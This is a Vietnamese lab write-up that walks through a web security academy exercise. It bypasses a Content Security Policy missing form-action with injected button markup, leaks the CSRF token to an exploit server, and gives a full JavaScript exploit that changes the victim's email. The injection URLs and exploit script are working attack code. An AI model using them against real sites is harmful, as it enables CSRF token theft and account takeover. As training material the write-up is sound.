![[Pasted image 20261101150439.png]]

### 1. Trinh sát & Phát hiện cơ chế chặn
Đăng nhập bằng `wiener:peter`, mình vào trang **My Account** (đổi email).
Nếu bạn thử chèn một payload XSS cơ bản như `<script>alert(1)</script>` vào ô email, nó sẽ bị chặn ngay bởi **client-side validation** (do thuộc tính `type="email"` của ô input).
![[Pasted image 20261101150744.png]]
==🟢**Cách lách validation:**==
Bạn mở DevTools (F12), chuột phải vào ô input email, ==chọn **Edit as HTML**, đổi `type="email"` thành `type="text"`.== Bây giờ bạn có thể nhập payload thoải mái. 
Tuy nhiên, nếu nhìn kỹ vào source code của form, bạn sẽ thấy có một thẻ input ẩn:
`<input required type="hidden" name="csrf" value="...">`
Đây là CSRF token. Nó báo hiệu rằng nếu ta muốn đổi email của nạn nhân, ta **bắt buộc** phải có cái token này.
>->ok

==🟢Mình thử nhập payload theo dạng email hợp lệ:== `foo@example.com"><img src= onerror=alert(1)>` và submit. ==Trang web reflect payload ra nhưng đã bị escape (mã hóa) an toàn.== Nếu thử dùng URL parameter `?email=<img src onerror=alert(1)>`, ==payload cũng bị chặn bởi **CSP (Content Security Policy)** - bạn có thể thấy log báo lỗi trong tab Console của DevTools==.
![[Pasted image 20261101151541.png]]
> [!info] 
> đocj thêm về csp ở đay [[CSP]] , [[Csrf Same site]]
> -> lưu ý về 2 trường samesite và csp -> khá dễ nhầm lẫn

### 2. Tìm điểm yếu của CSP (==Kỹ thuật Dangling Markup==)
CSP của trang web này rất chặt, nó chặn hầu hết các thẻ script hay gọi tài nguyên từ bên ngoài. Tuy nhiên, ==🟢nó lại **thiếu directive `form-action`**==. 
==🟢Nghĩa là gì?== Nghĩa là ==dù không chạy được script, mình vẫn có thể chèn một cái nút bấm vào trang.== Khi nạn nhân bấm vào nút đó, form đăng ký hiện tại (đang chứa email và CSRF token) sẽ bị "submit" (gửi đi) đến địa chỉ do mình chỉ định.

> [!question] 
> Cái này có phải fake nút bấm bằng xss ko?

**Bước 1: Thử nghiệm gửi dữ liệu ra ngoài**
Lên **Exploit Server**, copy cái URL của nó (dạng `https://exploit-xxx.exploit-server.net/exploit`).
Sau đó, trên lab, bạn sửa URL để inject một cái nút:
`https://YOUR-LAB-ID.web-security-academy.net/my-account?email=foo@bar"><button formaction="https://exploit-xxx.exploit-server.net/exploit">Click me</button>`

*(Lưu ý: Đề bài yêu cầu chữ "Click" để dụ bot bấm, và `foo@bar` để đánh lừa validation).*
![[Pasted image 20261101152813.png]]

![[Pasted image 20261101152827.png]]
-> khi click thì ta được đưa tới exploit website
> [!NOTE] 
> Bây giờ mình cần inject cái script trên , nó sẽ tạo 1 cái nút, mà khi nhấn nó sẽ redirect sang cái trang web hacker dựng lên
> -> một khi đã đi vào trang exploit websitye naỳ, thì mã js trên cái trang này sẽ gửi request tới trang web bài lab và đánh cắp thông tin 

Khi bạn load URL này và bấm nút "Click me", bạn sẽ thấy mình bị đẩy sang Exploit Server. Nhưng để ý kỹ trên URL, **không thấy CSRF token đâu cả**. Vì mặc định form dùng phương thức `POST`, dữ liệu bị giấu trong body.
![[Pasted image 20261101153218.png]]

> [!important] Kịch bản tấn công thực tế của reflect xss
> Contents

**Bước 2: Ép form dùng phương thức GET**
Để "hút" được CSRF token ra ngoài URL, mình thêm thuộc tính `formmethod="get"` vào nút bấm:
`https://YOUR-LAB-ID.web-security-academy.net/my-account?email=foo@bar"><button formaction="https://exploit-xxx.exploit-server.net/exploit" formmethod="get">Click me</button>`

Bây giờ bấm nút, bạn sẽ thấy trên Exploit Server, thanh URL có dạng: `?csrf=TOKEN_BI_MAT&email=...`. Ta đã lấy được token!

### 3. Viết mã khai thác (Exploit Script)
Bây giờ mình lên Exploit Server, dán đoạn script sau vào phần Body (nhớ thay URL lab và URL exploit server của bạn vào):

```html
<body>
<script>
const academyFrontend = "https://YOUR-LAB-ID.web-security-academy.net/";
const exploitServer = "https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit";

const url = new URL(location);
const csrf = url.searchParams.get('csrf');

if (csrf) {
    // NẾU CÓ TOKEN: Tự động tạo form và đổi email của nạn nhân
    const form = document.createElement('form');
    const email = document.createElement('input');
    const token = document.createElement('input');

    token.name = 'csrf';
    token.value = csrf;

    email.name = 'email';
    email.value = 'hacker@evil-user.net'; // Email đích

    form.method = 'post';
    form.action = `${academyFrontend}my-account/change-email`;
    form.append(email);
    form.append(token);
    document.documentElement.append(form);
    form.submit(); 
} else {
    // NẾU KHÔNG CÓ TOKEN: Chuyển hướng nạn nhân đến trang bị lỗi XSS kèm nút bấm
    location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
}
</script>
</body>
```

![[Pasted image 20261101160453.png]]
### 4. Giải thích Script hoạt động như thế nào?
Khi bạn gửi Exploit cho nạn nhân (con bot), con bot sẽ tải trang Exploit Server của bạn.
1. **Lần chạy đầu tiên (Chưa có token):** Script kiểm tra URL, không thấy `csrf`. Nó sẽ rơi vào khối `else`, lập tức redirect (chuyển hướng) con bot đến trang My Account của lab, kèm theo payload chèn nút "Click me".
2. Bot nhìn thấy nút "Click me" (vì đề bài bắt buộc phải có chữ Click để bot tự động click).
3. Khi bot click, form (có chứa CSRF token thật của bot) bị submit bằng phương thức GET sang Exploit Server của bạn. Lúc này trên URL của Exploit Server có chứa `?csrf=TOKEN_THAT`.
4. **Lần chạy thứ hai (Đã có token):** Script lại chạy, lần này phát hiện có biến `csrf` trên URL. Nó lập tức tạo một form ẩn, nhét cái token vừa trộm được và email `hacker@evil-user.net`, rồi tự động submit về server của lab để đổi email.
5. Lab Solved!
![[Pasted image 20261101160436.png]]
---
** Lưu ý  (Rất dễ dính chưởng):**
Trong lúc mày mò test, nếu bạn lỡ tay đổi email của tài khoản `wiener` thành `hacker@evil-user.net` rồi, thì lúc gửi exploit cho bot, nó sẽ bị lỗi (vì email này đã bị bạn chiếm mất). Nhớ đổi email của bạn sang cái khác, hoặc dùng một email hoàn toàn mới trong script (`hacker2@evil-user.net`) để đảm bảo bot đổi được nhé.